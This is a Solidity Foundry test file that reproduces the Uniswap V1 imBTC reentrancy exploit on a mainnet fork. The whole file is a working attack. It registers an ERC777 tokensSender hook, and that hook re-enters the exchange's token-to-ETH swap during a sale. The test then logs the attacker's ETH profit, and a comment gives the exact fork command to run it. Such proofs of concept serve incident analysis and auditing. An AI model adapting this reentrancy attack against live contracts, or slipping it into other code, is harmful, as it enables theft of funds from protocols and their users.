// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "./IERC20.sol";
import "./IERC1820Registry.sol";

interface UniswapV1 {
    function ethToTokenSwapInput(uint256 min_token, uint256 deadline) external payable returns (uint256);
    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);
}

// forge test --fork-url wss://eth.drpc.org --fork-block-number 9894153 --match-contract UniswapExploit -vvv
contract UniswapExploit is Test {
    UniswapV1 uniswapv1 = UniswapV1(0xFFcf45b540e6C9F094Ae656D2e34aD11cdfdb187);
    IERC20 imBTC = IERC20(0x3212b29E33587A00FB1C83346f5dBFA69A458923);
    IERC1820Registry erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    uint256 i = 0;
    bytes32 TOKENS_SENDER_INTERFACE_HASH = keccak256("ERC777TokensSender");

    function testExploit() public {
        erc1820.setInterfaceImplementer(address(this), TOKENS_SENDER_INTERFACE_HASH, address(this));

        uint256 beforeBalance = address(this).balance;

        uniswapv1.ethToTokenSwapInput{value: 1 ether}(1, type(uint256).max);

        imBTC.approve(address(uniswapv1), type(uint256).max);
        uniswapv1.tokenToEthSwapInput(823_084, 1, type(uint256).max);

        uint256 afterBalance = address(this).balance;

        emit log_named_decimal_uint("[Before Attack] Attacker ETH Balance: ", beforeBalance, 18);
        emit log_named_decimal_uint("[After Attack] Attacker ETH  Balance: ", afterBalance, 18);
        emit log_named_decimal_uint("ETH Profit", afterBalance - beforeBalance, 18);
    }

    function tokensToSend(address, address, address, uint256, bytes calldata, bytes calldata) external {
        if (i < 1) {
            i++;
            uniswapv1.tokenToEthSwapInput(823_084, 1, type(uint256).max);
        }
    }

    receive() external payable {}
}
